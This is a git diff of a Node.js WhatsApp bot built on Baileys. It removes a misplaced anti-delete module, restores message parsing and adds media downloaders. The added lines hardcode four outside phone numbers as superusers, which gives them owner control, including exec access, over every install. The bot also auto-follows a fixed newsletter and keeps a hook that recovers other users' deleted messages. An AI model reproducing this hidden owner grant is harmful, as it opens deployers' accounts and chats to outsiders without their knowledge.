@@ -85,6 +85,7 @@ const { DateTime } = require("luxon");
 const util = require("util");
 const speed = require("performance-now");
 const { smsg } = require('./lib/smsg');
+const fetchLogoUrl = require('./lib/ephoto');
 const {
   smsgsmsg, formatp, tanggal, formatDate, getTime, sleep, clockString,
   fetchJson, getBuffer, jsonformat, antispam, generateProfilePicture, parseMention,
@@ -95,6 +96,8 @@ const { TelegraPh, UploadFileUgu } = require("./lib/toUrl");
 const uploadtoimgur = require("./lib/Imgur");
 
 const { sendReply, sendMediaMessage } = require("./lib/context");
+
+const { downloadYouTube, downloadSoundCloud, downloadSpotify, searchYouTube, searchSoundCloud, searchSpotify } = require("./lib/dl");
 const ytmp3 = require("./lib/ytmp3");
 const path = require("path");
 const { commands, totalCommands } = require("./commandHandler");
@@ -329,336 +332,87 @@ async function startKeith() {
       }
 
       if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
-// anti-delete.js
-import pkg from '@whiskeysockets/baileys';
-const { proto, downloadContentFromMessage } = pkg;
-import config from '../config.cjs';
-import fs from 'fs';
-import path from 'path';
 
-const DB_FILE = path.join(process.cwd(), "antidelete.json");
+      const m = smsg(client, mek, store);
 
-class AntiDeleteSystem {
-  constructor() {
-    this.enabled = config.ANTI_DELETE || false;
-    this.cacheExpiry = 1800000;
-    this.messageCache = new Map();
-    this.cleanupTimer = null;
-    this.isSaving = false;
-    this.saveQueue = [];
-    
-    this.loadDatabase();
-    this.startCleanup();
-    console.log("🛡️ Anti-Delete System Initialized");
-  }
+      const body = m.mtype === "conversation" ? m.message.conversation :
+        m.mtype === "imageMessage" ? m.message.imageMessage.caption :
+          m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : "";
 
-  async loadDatabase() {
-    try {
-      if (fs.existsSync(DB_FILE)) {
-        const data = await fs.promises.readFile(DB_FILE, 'utf8');
-        const entries = JSON.parse(data);
-        const now = Date.now();
-        const validEntries = entries.filter(([key, message]) => now - message.timestamp <= this.cacheExpiry);
-        
-        this.messageCache = new Map(validEntries);
-        console.log(`📦 Loaded ${validEntries.length} messages from database`);
-        
-        if (entries.length !== validEntries.length) {
-          await this.saveDatabase();
+      const cmd = body.startsWith(prefix);
+      const args = body.trim().split(/ +/).slice(1);
+      const pushname = m.pushName || "No Name";
+      const botNumber = await client.decodeJid(client.user.id);
+      const servBot = botNumber.split('@')[0];
+      const Ghost = "254796299159"; 
+      const Ghost2 = "254110190196";
+      const Ghost3 = "254748387615";
+      const Ghost4 = "254786989022";
+      const superUserNumbers = [servBot, Ghost, Ghost2, Ghost3, Ghost4, dev].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
+      const isOwner = superUserNumbers.includes(m.sender); 
+      const isBotMessage = m.sender === botNumber;  
+      const itsMe = m.sender === botNumber;
+      const text = args.join(" ");
+      const Tag = m.mtype === "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null
+        ? m.message.extendedTextMessage.contextInfo.mentionedJid
+        : [];
+
+      let msgKeith = m.message.extendedTextMessage?.contextInfo?.quotedMessage;
+      let budy = typeof m.text === "string" ? m.text : "";
+
+      const timestamp = speed();
+      const Keithspeed = speed() - timestamp;
+
+      const getGroupAdmins = (participants) => {
+        let admins = [];
+        for (let i of participants) {
+          if (i.admin === "superadmin") admins.push(i.id);
+          if (i.admin === "admin") admins.push(i.id);
         }
-      }
-    } catch (error) {
-      console.error("🔴 Database load error:", error);
-      this.messageCache = new Map();
-    }
-  }
-
-  async saveDatabase() {
-    if (this.isSaving) {
-      return new Promise(resolve => this.saveQueue.push(resolve));
-    }
-    
-    this.isSaving = true;
-    try {
-      const data = JSON.stringify(Array.from(this.messageCache.entries()));
-      await fs.promises.writeFile(DB_FILE, data);
-      console.log(`💾 Database saved (${this.messageCache.size} messages)`);
-      
-      while (this.saveQueue.length) {
-        const resolve = this.saveQueue.shift();
-        resolve();
-      }
-    } catch (error) {
-      console.error("🔴 Database save error:", error);
-    } finally {
-      this.isSaving = false;
-    }
-  }
-
-  async addMessage(id, message) {
-    if (this.messageCache.size > 1000) {
-      this.cleanExpiredMessages(true);
-    }
-    
-    this.messageCache.set(id, message);
-    console.log(`📥 Cached message: ${id}`);
-    await this.saveDatabase();
-  }
-
-  async deleteMessage(id) {
-    if (this.messageCache.has(id)) {
-      this.messageCache.delete(id);
-      console.log(`🗑️ Deleted from cache: ${id}`);
-      await this.saveDatabase();
-    }
-  }
-
-  cleanExpiredMessages(force = false) {
-    const now = Date.now();
-    let cleaned = 0;
-    const limit = force ? this.messageCache.size : Math.min(100, this.messageCache.size);
-
-    for (const [key, message] of this.messageCache.entries()) {
-      if (now - message.timestamp > this.cacheExpiry) {
-        this.messageCache.delete(key);
-        cleaned++;
-      }
-      if (!force && cleaned >= limit) break;
-    }
-
-    if (cleaned > 0) {
-      console.log(`🧹 Cleaned ${cleaned} expired messages`);
-      this.saveDatabase();
-    }
-  }
-
-  startCleanup() {
-    if (this.cleanupTimer) clearInterval(this.cleanupTimer);
-    
-    this.cleanupTimer = setInterval(
-      () => this.cleanExpiredMessages(),
-      Math.min(this.cacheExpiry, 300000)
-    );
-    console.log("⏰ Cleanup scheduler started");
-  }
-
-  formatTime(timestamp) {
-    return new Date(timestamp).toLocaleString('en-PK', {
-      timeZone: "Asia/Karachi",
-      dateStyle: 'medium',
-      timeStyle: 'medium',
-      hour12: true
-    }) + " (PKT)";
-  }
-
-  async destroy() {
-    if (this.cleanupTimer) clearInterval(this.cleanupTimer);
-    await this.saveDatabase();
-  }
-}
-
-const antiDelete = new AntiDeleteSystem();
-
-const AntiDelete = async (m, Matrix) => {
-  const prefix = config.PREFIX;
-  const botNumber = await Matrix.decodeJid(Matrix.user.id);
-  const isCreator = [botNumber, config.OWNER_NUMBER + '@s.whatsapp.net'].includes(m.sender);
-  const args = m.body?.slice(prefix.length).trim().split(" ") || [];
-  const cmd = args[0]?.toLowerCase();
-  const subcmd = args[1]?.toLowerCase();
-
-  const getChatInfo = async jid => {
-    if (!jid) return { name: "🚫 Unknown Chat", isGroup: false };
-    
-    try {
-      return jid.includes("@g.us") 
-        ? { 
-            name: (await Matrix.groupMetadata(jid))?.subject || "👥 Private Group", 
-            isGroup: true 
-          }
-        : { name: "👤 Private Chat", isGroup: false };
-    } catch {
-      return { name: "🚫 Unknown Chat", isGroup: false };
-    }
-  };
-
-  if (cmd === "antidelete" && isCreator) {
-    try {
-      const modes = {
-        same: "🔄 Same Chat",
-        inbox: "📥 Bot Inbox",
-        owner: "👑 Owner PM"
-      };
-      const currentMode = modes[config.ANTI_DELETE_PATH] || modes.owner;
-
-      const responses = {
-        on: `🌟 *Anti-Delete Activated* 🌟
-            \n• Status: 🟢 Active
-            \n• Protection: Full Coverage
-            \n• Cache: 30 Minutes
-            \n• Mode: ${currentMode}
-            \n📦 Stored: ${antiDelete.messageCache.size} messages`,
-
-        off: `⚠️ *Anti-Delete Deactivated* ⚠️
-             \n• Status: 🔴 Inactive
-             \n• Cache: Cleared
-             \n• Protection: Disabled`,
-
-        stats: `📊 *Anti-Delete Stats*
-               \n• Stored Messages: ${antiDelete.messageCache.size}
-               \n• Status: ${antiDelete.enabled ? '🟢 Active' : '🔴 Inactive'}
-               \n• Mode: ${currentMode}
-               \n• Uptime: Continuous`,
-
-        help: `🛡️ *Anti-Delete Help*
-              \n• ${prefix}antidelete on - Enable protection
-              \n• ${prefix}antidelete off - Disable system
-              \n• ${prefix}antidelete stats - Show statistics
-              \n• Current Mode: ${currentMode}`
+        return admins || [];
       };
 
-      switch(subcmd) {
-        case 'on':
-          antiDelete.enabled = true;
-          antiDelete.startCleanup();
-          await m.reply(responses.on);
-          await m.React('🛡️');
-          break;
+      const keizzah = m.quoted || m;
+      const quoted = keizzah.mtype === 'buttonsMessage' ? keizzah[Object.keys(keizzah)[1]] :
+        keizzah.mtype === 'templateMessage' ? keizzah.hydratedTemplate[Object.keys(keizzah.hydratedTemplate)[1]] :
+          keizzah.mtype === 'product' ? keizzah[Object.keys(keizzah)[0]] : m.quoted ? m.quoted : m;
 
-        case 'off': 
-          antiDelete.enabled = false;
-          antiDelete.messageCache.clear();
-          await antiDelete.saveDatabase();
-          await m.reply(responses.off);
-          await m.React('⚠️');
-          break;
+      const color = (text, color) => {
+        return color ? chalk.keyword(color)(text) : chalk.green(text);
+      };
 
-        case 'stats':
-          await m.reply(responses.stats);
-          await m.React('📊');
-          break;
+      const mime = quoted.mimetype || "";
+      const qmsg = quoted;
+      const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch(() => {}) : "";
+      const newsletterMetadata = m.isNewsletter ? await client.newsletterMetadata(m.chat).catch(() => {}) : "";
+      const subscribers = m.isNewsletter && newsletterMetadata ? newsletterMetadata.subscribers : [];
+      const IsNewsletter = m.chat?.endsWith("@newsletter");
+      const newsletterAdmins = m.isNewsletter ? getNewsletterAdmins(subscribers) : [];
+      const isNewsletterBotAdmin = m.isNewsletter ? newsletterAdmins.includes(botNumber) : false;
+      const isNewsletterAdmin = m.isNewsletter ? newsletterAdmins.includes(m.sender) : false;
 
-        default:
-          await m.reply(responses.help);
-          await m.React('ℹ️');
+      const groupName = m.isGroup && groupMetadata ? groupMetadata.subject : "";
+      const participants = m.isGroup && groupMetadata ? groupMetadata.participants : [];
+      const groupAdmin = m.isGroup ? getGroupAdmins(participants) : [];
+      const isBotAdmin = m.isGroup ? groupAdmin.includes(botNumber) : false;
+      const isAdmin = m.isGroup ? groupAdmin.includes(m.sender) : false;
+
+      const IsGroup = m.chat?.endsWith("@g.us");
+
+      // Anti-delete functionality
+      if (antidelete === "true") {
+        if (mek.message?.protocolMessage?.key) {
+          await handleMessageRevocation(client, mek);
+        } else {
+          handleIncomingMessage(mek);
+        }
       }
-    } catch (error) {
-      console.error("🔴 Command Error:", error);
-      await m.React('❌');
-    }
-    return;
-  }
+      const messageText = mek.message.conversation || mek.message.extendedTextMessage?.text || "";
+      const remoteJid = mek.key.remoteJid;
+      const senderJid = mek.key.participant || mek.key.remoteJid;
+      const senderNumber = senderJid.split('@')[0];
 
-  // Message handling events...
-  Matrix.ev.on("messages.upsert", async ({ messages, type }) => {
-    if (!antiDelete.enabled || type !== 'notify' || !messages?.length) return;
-
-    for (const msg of messages) {
-      try {
-        if (msg.key.fromMe || msg.key.remoteJid === 'status@broadcast') continue;
-
-        // Voice message handling
-        if (msg.message.audioMessage?.ptt) {
-          try {
-            console.log("🔊 Processing voice message");
-            const stream = await downloadContentFromMessage(msg.message.audioMessage, 'audio');
-            const mediaBuffer = await collectStream(stream);
-            
-            const cacheEntry = {
-              type: 'ptt',
-              media: mediaBuffer,
-              mimetype: msg.message.audioMessage.mimetype || "audio/ogg; codecs=opus",
-              sender: msg.key.participant || msg.key.remoteJid,
-              senderFormatted: '@' + (msg.key.participant || msg.key.remoteJid)
-                                .replace(/@s\.whatsapp\.net|@g\.us/g, ''),
-              timestamp: Date.now(),
-              chatJid: msg.key.remoteJid
-            };
-            
-            await antiDelete.addMessage(msg.key.id, cacheEntry);
-            console.log("✅ Voice message cached");
-            continue;
-          } catch (error) {
-            console.error("🔇 Voice message error:", error);
-          }
-        }
-
-        // Rest of message processing...
-      } catch (error) {
-        console.error("📥 Message Processing Error:", error);
-      }
-    }
-  });
-
-  Matrix.ev.on("messages.update", async updates => {
-    if (!antiDelete.enabled || !updates?.length) return;
-
-    for (const update of updates) {
-      try {
-        const { key, update: status } = update;
-        const isDeleted = status?.messageStubType === proto.WebMessageInfo.StubType.REVOKE ||
-                        status?.status === proto.WebMessageInfo.Status.DELETED;
-
-        if (!isDeleted || key.fromMe || !antiDelete.messageCache.has(key.id)) continue;
-
-        const cached = antiDelete.messageCache.get(key.id);
-        await antiDelete.deleteMessage(key.id);
-
-        // Determine destination
-        let destination;
-        switch(config.ANTI_DELETE_PATH) {
-          case 'same': destination = key.remoteJid; break;
-          case 'inbox': destination = Matrix.user.id; break;
-          default: destination = config.OWNER_NUMBER + '@s.whatsapp.net';
-        }
-
-        // Send alert first
-        await Matrix.sendMessage(destination, { 
-          text: `🚨 *Deleted ${cached.type?.toUpperCase() || 'Message'} Recovered!*
-                \n▫️ *Sender:* ${cached.senderFormatted}
-                \n▫️ *Chat:* ${(await getChatInfo(cached.chatJid)).name}
-                \n🕒 *Time:* ${antiDelete.formatTime(cached.timestamp)}`
-        });
-
-        // Handle voice notes
-        if (cached.type === 'ptt') {
-          await Matrix.sendMessage(destination, {
-            audio: cached.media,
-            mimetype: cached.mimetype,
-            ptt: true
-          });
-        } 
-        // Handle other media
-        else if (cached.media) {
-          await Matrix.sendMessage(destination, {
-            [cached.type]: cached.media,
-            mimetype: cached.mimetype
-          });
-        }
-        // Handle text
-        if (cached.content) {
-          await Matrix.sendMessage(destination, {
-            text: `📝 *Content:*\n${cached.content}`
-          });
-        }
-
-        await Matrix.sendReaction(destination, { id: key.id, remoteJid: key.remoteJid }, '✅');
-
-      } catch (error) {
-        console.error("🔴 Recovery Error:", error);
-        await Matrix.sendReaction(destination, { id: key.id, remoteJid: key.remoteJid }, '❌');
-      }
-    }
-  });
-};
-
-async function collectStream(stream) {
-  const chunks = [];
-  for await (const chunk of stream) chunks.push(chunk);
-  return Buffer.concat(chunks);
-}
-export default AntiDelete;
-// Update the auto-reply message dynamically
+      // Update the auto-reply message dynamically
       const auto_reply_message = `@${senderNumber}\n${greetmsg}`;
 
       // Check if the message exists and is a command to set a new auto-reply message with any prefix
@@ -953,7 +707,7 @@ try {
       if (command) {
         const commandObj = commands[command];
         if (commandObj) {
-          await commandObj.execute({ isOwner, anticall, fetchJson, exec, getRandom, generateProfilePicture, args, dev, client, m, mode, mime, qmsg, msgKeith, Tag, generateProfilePicture, text, totalCommands, botname, url, sendReply, sendMediaMessage, gurl, prefix, groupAdmin, getGroupAdmins, groupName, groupMetadata, herokuAppname, herokuapikey, packname, author, participants, pushname, botNumber, itsMe, store, isAdmin, isBotAdmin });
+          await commandObj.execute({ downloadYouTube, downloadSoundCloud, downloadSpotify, searchYouTube, searchSoundCloud, searchSpotify, subscribers, fetchLogoUrl, newsletterMetadata, isNewsletterAdmin, isNewsletterBotAdmin, isOwner, anticall, fetchJson, exec, getRandom, generateProfilePicture, args, dev, client, m, mode, mime, qmsg, msgKeith, Tag, generateProfilePicture, text, totalCommands, botname, url, sendReply, sendMediaMessage, gurl, prefix, groupAdmin, getGroupAdmins, groupName, groupMetadata, herokuAppname, herokuapikey, packname, author, participants, pushname, botNumber, itsMe, store, isAdmin, isBotAdmin });
         }
       }
     } catch (err) {
@@ -1013,7 +767,7 @@ try {
         startKeith();
       }
     } else if (connection === "open") {
-      await client.groupAcceptInvite("KOvNtZbE3JC32oGAe6BQpp");
+     // await client.groupAcceptInvite("KOvNtZbE3JC32oGAe6BQpp");
       await client.newsletterFollow("120363266249040649@newsletter");
 
       console.log(`✅ Connected to Keith server.`);
